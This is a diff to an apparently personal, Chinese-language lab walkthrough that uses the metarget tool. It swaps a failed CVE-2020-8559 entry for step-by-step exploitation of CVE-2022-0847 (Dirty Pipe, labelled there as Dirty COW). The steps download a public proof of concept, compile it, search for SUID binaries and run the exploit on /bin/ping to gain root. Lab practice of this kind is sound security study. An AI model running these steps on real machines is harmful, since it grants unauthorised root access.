@@ -134,11 +134,39 @@ https://github.com/Frichetten/CVE-2019-5736-PoC
 
 
 
-11.	cve-2020-8559 权限提升（疑似需要k8s集群环境，但安装是不行的）
-root@VM-8-3-ubuntu:~/metarget# ./metarget cnv install cve-2020-8559 --domestic --verbose
-![image](https://github.com/user-attachments/assets/4e5fa0a0-f7e6-4213-836b-6569c8f06502)
-不行，解决不了，安装k8s的时候完蛋了
+11.	cve-2022-0847 （脏牛）内核权限提升
 
+环境安装
+root@VM-8-3-ubuntu:~/metarget# ./metarget cnv install cve-2022-0847
+![image](https://github.com/user-attachments/assets/c0ae4191-bac9-4a56-be40-a47c1c6b716b)
+
+
+
+mkdir dirtypipez
+
+cd dirtypipez
+
+
+
+
+https://haxx.in/files/dirtypipez.c
+访问网站，下载poc
+![image](https://github.com/user-attachments/assets/da5ab737-a512-4443-9865-ddbaeb7a1b0c)
+
+编译poc：
+gcc dirtypipez.c -o dirtypipez
+
+查找可以使用提权的命令
+find / -perm -u=s -type f 2>/dev/null
+
+![image](https://github.com/user-attachments/assets/dbc6c008-2689-411b-82f9-26a51bc33d61)
+
+这里使用的是/bin/ping
+
+./dirtypipez /bin/ping
+
+![image](https://github.com/user-attachments/assets/b9262aae-fef8-4493-8999-21ef44a93467)
+提权成功
 
 
 
